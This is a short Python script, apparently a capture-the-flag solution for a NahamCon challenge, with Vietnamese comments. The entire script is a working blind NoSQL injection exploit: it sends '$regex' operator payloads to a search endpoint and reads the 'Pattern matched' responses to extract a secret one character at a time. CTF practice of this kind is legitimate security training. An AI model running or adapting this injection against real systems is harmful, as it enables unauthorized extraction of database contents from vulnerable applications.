import requests
import string

url = "http://challenge.nahamcon.com:30566/search"

charset_before_brace = "flag{"
charset_after_brace = string.ascii_letters + string.digits + "_}-"

found = ""

while True:
    if '{' not in found:
        charset = charset_before_brace
    else:
        charset = charset_after_brace

    for c in charset:
        test = found + c
        query_string = f'flag: {{ "$regex": "^{test}" }} }}'
        data = {
            "query": query_string,
            "collection": "flags"
        }
        response = requests.post(url, data=data)

        if "Pattern matched" in response.text:
            found += c
            print(f"[+] Đã tìm được: {found}")
            break
    else:
        print(f"[✓] Flag hoàn chỉnh: {found}")
        exit()
  • Chờ đợi và nhận flag thoi.
